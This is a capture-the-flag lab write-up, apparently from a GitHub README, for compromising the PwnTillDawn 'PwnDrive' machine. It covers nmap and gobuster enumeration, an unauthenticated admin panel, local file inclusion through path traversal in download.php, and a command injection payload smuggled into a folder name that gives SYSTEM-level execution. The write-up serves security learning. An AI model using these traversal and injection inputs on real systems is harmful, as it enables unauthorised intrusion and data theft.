# VULNERABLE-MACHINE-PwnTillDwn

# 🛡️ Vulnerability Analysis Lab – PwnTillDawn 

## 📌 Objective

The objective of this lab is to:

* Connect to the PwnTillDawn VPN environment
* Discover active hosts in the network
* Perform service and vulnerability enumeration
* Identify and exploit vulnerabilities
* Achieve **proof of compromise (SYSTEM access)**

---

## 🖥️ Lab Environment

* Attacker Machine: Kali Linux
* VPN: OpenVPN
* Target Network: `10.150.150.0/24`

---

## 🔌 Step 1 – VPN Connection

Connected to the lab using:

```bash
sudo openvpn PwnTillDawn.ovpn
```

### ✅ Verification

* Tunnel interface created: `tun0`
* Assigned IP: `10.66.67.206`

```
Initialization Sequence Completed
```

📸 *Screenshot: VPN connection success*

---

## 🌐 Step 2 – Network Discovery

Performed host discovery scan:

```bash
nmap -sn 10.150.150.0/24
```

### 📊 Results

* 256 IPs scanned
* 48 hosts discovered

Selected target:

```
10.150.150.11
```

📸 *Screenshot: nmap host discovery*

---

## 🔍 Step 3 – Port & Service Enumeration

Executed service scan:

```bash
nmap -sC -sV 10.150.150.11
```

---

### 📊 Open Ports & Services

| Port | Service | Version                |
| ---- | ------- | ---------------------- |
| 21   | FTP     | Xlight FTP 3.9         |
| 80   | HTTP    | Apache 2.4.46 (Win64)  |
| 135  | MSRPC   | Windows RPC            |
| 139  | NetBIOS | Windows                |
| 443  | HTTPS   | Apache                 |
| 445  | SMB     | Windows Server 2008 R2 |
| 1433 | MSSQL   | SQL Server 2012        |
| 3306 | MySQL   | MariaDB                |
| 3389 | RDP     | Windows                |

---

### 🔎 Key Observations

* Target OS: **Windows Server 2008 R2**
* Multiple exposed services → large attack surface
* Database services (MSSQL & MySQL) present
* Web server running PHP-based application

📸 *Screenshot: nmap scan output*

---

## 🌐 Step 4 – Web Enumeration

Accessed web application:

```
http://10.150.150.11
```

Application identified:

> **PwnDrive – Your Personal Online Storage**

---

### 🔹 Directory Brute Force

```bash
gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt
```

---

### 📂 Discovered Endpoints

* `/admin`
* `/upload`
* `/myfiles.php`
* `/download.php`
* `/components`
* `/inc`
* `/utils`

---

## 🚨 Step 5 – Vulnerability Discovery

### 🔴 1. Broken Access Control

* `/admin` accessible without authentication
* Able to **create users without login**

👉 Critical misconfiguration

---

### 🔴 2. File Upload Functionality

After login:

* Accessed: `/myfiles.php`
* File upload allowed

Uploaded files stored in:

```
/upload/11/
```

👉 Potential for web shell upload

---

### 🔴 3. Local File Inclusion (LFI)

Vulnerable endpoint:

```
download.php?mode=view_file_content&filename=
```

---

### ✅ Exploitation

Accessed system file:

```
../../../../windows/win.ini
```

👉 Confirms LFI vulnerability

---

### 🔴 4. Source Code Disclosure

Accessed configuration file:

```
../../../../xampp/htdocs/config.php
```

---

### 🔥 Critical Finding

```php
define('CMD_INJ_ON_FOLDER_CREATE', true);
```

👉 Indicates **Command Injection vulnerability exists**

---

## 💥 Step 6 – Exploitation (Command Injection)

Used folder creation feature to inject commands.

### 🔹 Payload Used

```
test & whoami > C:\xampp\htdocs\upload\11\result.txt
```

---

### 📌 Explanation

* `test` → normal folder name
* `&` → command separator
* `whoami` → executed on system
* Output redirected to web-accessible file

---

## 🏆 Step 7 – Proof of Compromise

Accessed result file:

```
http://10.150.150.11/upload/11/result.txt
```

---

### ✅ Output

```
nt authority\system
```
📸 *Screenshot: result file output*
---

## 🎯 Final Result

✔ Remote Command Execution (RCE)
✔ SYSTEM-level access obtained
✔ Full compromise achieved

---

## 🔐 Vulnerabilities Identified

| Vulnerability              | Severity |
| -------------------------- | -------- |
| Broken Access Control      | High     |
| Local File Inclusion (LFI) | High     |
| Command Injection          | Critical |
| Insecure File Upload       | High     |

---

## 🧠 Lessons Learned

* Poor access control exposes sensitive functionality
* LFI can lead to **source code disclosure**
* Source code analysis reveals hidden vulnerabilities
* Command injection results in **full system compromise**
* Always validate and sanitize user input

---

## 📌 Status

🟢 **Lab Completed Successfully**
🏆 **Proof of Compromise Achieved (SYSTEM Access)**

---
